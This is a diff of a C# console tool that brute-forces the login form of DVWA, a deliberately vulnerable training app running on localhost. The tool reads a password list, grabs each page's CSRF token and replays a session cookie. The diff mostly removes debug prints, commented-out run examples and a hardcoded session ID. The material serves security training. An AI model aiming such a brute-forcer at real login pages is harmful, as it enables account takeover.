@@ -9,17 +9,6 @@ namespace DVWA_BruteForce_HighSecurity
     {
         static async Task Main(string[] args)
         {
-            // default running: dotnet run --
-            // dotnet run -- --username test
-            // dotnet run -- --url testurl
-            // dotnet run -- --url http://localhost:3000/vulnerabilities/brute/ --username test
-            // dotnet run -- --url "http://localhost:3000/vulnerabilities/brute/" --username test
-            // dotnet run -- --passwordList "C:\Users\chris\Downloads\PasswordListNewPath.txt"
-            // dotnet run -- --passwordList "C:\Users\chris\Downloads\PasswordList.csv"
-            // dotnet run -- --phpSessId nmal50l9m8re9sgnreen7a74e6 --username admin
-
-            // TODO: upload as a nuget pacakge with disclaimer. write blog post. 
-
             var usernameOption = new Option<string>(
                 name: "--username",
                 description: "The username to use for the login attempts.",
@@ -30,19 +19,11 @@ namespace DVWA_BruteForce_HighSecurity
                 description: "The URL of the login page.",
                 getDefaultValue: () => "http://localhost:3000/vulnerabilities/brute/");
 
-            // TODO: delete
             var phpSessIdOption = new Option<string>(
                 name: "--phpSessId",
-                description: "The PHP Session Id to include with the request headers.",
-                getDefaultValue: () => "nmal50l9m8re9sgnreen7a74e6") // TODO: delete default value
+                description: "The PHP Session Id to include with the request headers. " +
+                "This can be found by using browser DevTools and inspecting the cookies set by DVWA.")
             { IsRequired = true };
-
-            // TODO: uncomment
-            //var phpSessIdOption = new Option<string>(
-            //    name: "--phpSessId",
-            //    description: "The PHP Session Id to include with the request headers. " +
-            //    "This can be found by using browser DevTools and inspecting the cookies set by DVWA.")
-            //{ IsRequired = true };
 
             var passwordListOption = new Option<string>(
                 name: "--passwordList",
@@ -68,37 +49,21 @@ namespace DVWA_BruteForce_HighSecurity
 
         static async Task BruteForceLogin(string _username, string _targetBaseAddressURI, string _phpSessId, string _passwordListPath)
         {
-            Console.WriteLine(_username);
-            Console.WriteLine(_targetBaseAddressURI);
-            Console.WriteLine(_phpSessId);
-            Console.WriteLine(_passwordListPath);
-
             // Initialize AngleSharp settings
             IConfiguration config = Configuration.Default;
             IBrowsingContext context = BrowsingContext.New(config);
 
-            List<string> passwordList = new();
+            var cookieContents = $"PHPSESSID={_phpSessId}; security=high";
 
+            List<string> passwordList = new();
             if(_passwordListPath != null && _passwordListPath != "")
             {
                 passwordList = File.ReadLines(_passwordListPath).ToList();
             }
             else
             {
-                //Console.WriteLine("Default pass list used");
-                //passwordList = File.ReadLines("C:\\Users\\chris\\Documents\\Programming\\C#\\2023\\DVWA-BruteForce-HighSecurity\\DVWA-BruteForce-HighSecurity\\PasswordList.txt").ToList();
                 passwordList = File.ReadLines("PasswordList.txt").ToList();
-                //var passwordList = File.ReadLines("C:\\Users\\chris\\Documents\\Programming\\C#\\2023\\DVWA-BruteForce-HighSecurity\\DVWA-BruteForce-HighSecurity\\PasswordList.txt").ToList();
-                //var passwordList = File.ReadLines("C:\\Users\\chris\\Documents\\Programming\\C#\\2023\\DVWA-BruteForce-HighSecurity\\DVWA-BruteForce-HighSecurity\\PasswordList.csv").ToList();
             }
-
-            //var cookieContents = "PHPSESSID=nmal50l9m8re9sgnreen7a74e6; security=high";
-            var cookieContents = $"PHPSESSID={_phpSessId}; security=high";
-            // Console.WriteLine(cookieContents);
-
-            //var _targetBaseAddressURI = "http://localhost:3000/vulnerabilities/brute/";
-            //var csrfTokenName = "user_token";
-            //var _username = "admin";
 
             using (var httpClient = new HttpClient())
             {
@@ -110,7 +75,9 @@ namespace DVWA_BruteForce_HighSecurity
                     // Make a GET request to the login page and parse for the CSRF token
                     var loginPageResponseBody = await httpClient.GetStringAsync("");
                     var document = await context.OpenAsync(req => req.Content(loginPageResponseBody));
+#pragma warning disable CS8602 // Dereference of a possibly null reference.
                     var csrfToken = document.QuerySelector($"input[name='user_token']").GetAttribute("value");
+#pragma warning restore CS8602 // Dereference of a possibly null reference.
 
                     if (csrfToken == null || csrfToken.Length == 0)
                     {
@@ -131,7 +98,7 @@ namespace DVWA_BruteForce_HighSecurity
                     }
                     else
                     {
-                        Console.WriteLine($"Error - Unexpected webpage response received after attempting login (attempted password: {_password}.");
+                        Console.WriteLine($"Error - Unexpected webpage response received after attempting login (attempted password: {_password}).");
                     }
                 }
             }
